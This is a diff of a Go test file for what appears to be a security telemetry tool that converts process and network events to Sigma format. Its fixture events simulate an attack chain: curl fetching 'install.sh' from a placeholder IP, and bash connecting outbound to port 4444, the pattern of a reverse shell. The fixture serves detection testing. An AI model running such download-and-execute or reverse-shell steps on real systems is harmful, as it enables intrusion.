@@ -23,7 +23,7 @@ func exampleEvents() []*event.Event {
 			Proc: &event.Proc{PID: 701, PPID: 700, Exe: "/usr/bin/curl", Name: "curl", Username: "rifqi", Cwd: "/Users/rifqi",
 				Cmdline: "curl -fsSL http://198.51.100.23/install.sh", Parent: zsh}},
 		{Seq: 102, Time: t0.Add(2 * time.Second), Name: event.NetworkConnect, Source: "netpoll", Platform: event.PlatformMacOS,
-			Proc: &event.Proc{PID: 702, PPID: 700, Exe: "/bin/bash", Name: "bash", Username: "rifqi"},
+			Proc: &event.Proc{PID: 702, PPID: 700, PIDVersion: 7702, UniqueID: 41702, Exe: "/bin/bash", Name: "bash", Username: "rifqi", SigningID: "com.apple.bash", IsPlatform: true, IsSigned: true, CSCategory: "platform"},
 			Net:  &event.Net{Proto: "tcp", Direction: "outbound", SrcIP: "192.168.1.20", SrcPort: 50111, DstIP: "203.0.113.9", DstPort: 4444}},
 		{Seq: 103, Time: t0.Add(3 * time.Second), Name: event.NetworkConnect, Source: "netpoll", Platform: event.PlatformMacOS,
 			Proc: &event.Proc{PID: 703, PPID: 700, Exe: "/usr/bin/python3", Name: "python3", Username: "rifqi"},
@@ -36,7 +36,7 @@ func exampleEvents() []*event.Event {
 func TestElegiaExample(t *testing.T) {
 	var buf bytes.Buffer
 	for _, e := range exampleEvents() {
-		b, err := EncodeSigma(e, "macos", 0)
+		b, err := EncodeSigma(e, SigmaOptions{DefaultProduct: "macos", Host: "mac-01"}, 0)
 		if err != nil {
 			t.Fatal(err)
 		}
